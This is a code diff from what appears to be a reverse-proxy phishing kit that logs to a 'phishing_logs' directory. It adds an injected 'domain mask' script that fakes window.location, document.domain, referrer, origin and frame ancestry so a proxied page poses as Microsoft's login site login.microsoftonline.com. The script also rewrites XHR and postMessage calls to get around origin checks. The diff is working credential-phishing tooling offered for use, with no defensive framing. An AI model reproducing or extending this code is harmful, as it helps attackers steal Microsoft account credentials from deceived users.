@@ -77,6 +77,78 @@ const PROXY_PATHNAMES = {
     favicon: "/favicon.ico"
 };
 
+// ==================== DOMAIN MASK (INLINE) ====================
+const DOMAIN_MASK_SCRIPT = `
+(function() {
+    'use strict';
+    const fakeOrigin = 'https://login.microsoftonline.com';
+    const fakeHostname = 'login.microsoftonline.com';
+    const fakeHost = 'login.microsoftonline.com';
+    const fakeProtocol = 'https:';
+    const loc = window.location;
+    const newLocation = Object.create(loc, {
+        origin: { get: () => fakeOrigin, configurable: false },
+        hostname: { get: () => fakeHostname, configurable: false },
+        host: { get: () => fakeHost, configurable: false },
+        protocol: { get: () => fakeProtocol, configurable: false },
+        href: {
+            get: () => fakeOrigin + loc.pathname + loc.search + loc.hash,
+            set: (v) => { loc.href = v; },
+            configurable: false
+        },
+        ancestorOrigins: { get: () => new DOMStringList([fakeOrigin]), configurable: false }
+    });
+    try { delete window.location; } catch(e) {}
+    Object.defineProperty(window, 'location', {
+        get: () => newLocation,
+        set: (v) => { loc.href = v; },
+        configurable: false,
+        enumerable: true
+    });
+    Object.defineProperty(document, 'domain', {
+        get: () => fakeHostname,
+        set: () => {},
+        configurable: false
+    });
+    Object.defineProperty(document, 'referrer', {
+        get: () => fakeOrigin + '/',
+        configurable: false
+    });
+    Object.defineProperty(window, 'origin', {
+        get: () => fakeOrigin,
+        configurable: false
+    });
+    Object.defineProperty(window, 'self', { get: () => window, configurable: false });
+    Object.defineProperty(window, 'top', { get: () => window, configurable: false });
+    Object.defineProperty(window, 'parent', { get: () => window, configurable: false });
+    const origFetch = window.fetch;
+    window.fetch = function(input, init) {
+        let url = typeof input === 'string' ? input : input.url;
+        if (url && (url.includes('login.microsoftonline.com') || url.startsWith('/'))) {
+            return origFetch.call(this, input, init);
+        }
+        return origFetch.call(this, input, init);
+    };
+    const origXHROpen = XMLHttpRequest.prototype.open;
+    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
+        if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
+            const urlObj = new URL(url);
+            url = urlObj.pathname + urlObj.search + urlObj.hash;
+        }
+        return origXHROpen.call(this, method, url, async !== false, user, password);
+    };
+    const origPostMessage = window.postMessage;
+    window.postMessage = function(message, targetOrigin, transfer) {
+        if (targetOrigin === '*') return origPostMessage(message, targetOrigin, transfer);
+        if (targetOrigin && targetOrigin.includes('microsoftonline.com')) {
+            targetOrigin = fakeOrigin;
+        }
+        return origPostMessage(message, targetOrigin, transfer);
+    };
+    console.log('[DOMAIN MASK] Active – all origins now report as ' + fakeOrigin);
+})();
+`.replace(/<\/script>/gi, '<\\/script>');
+
 const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
 try {
     if (!fs.existsSync(LOGS_DIRECTORY)) {
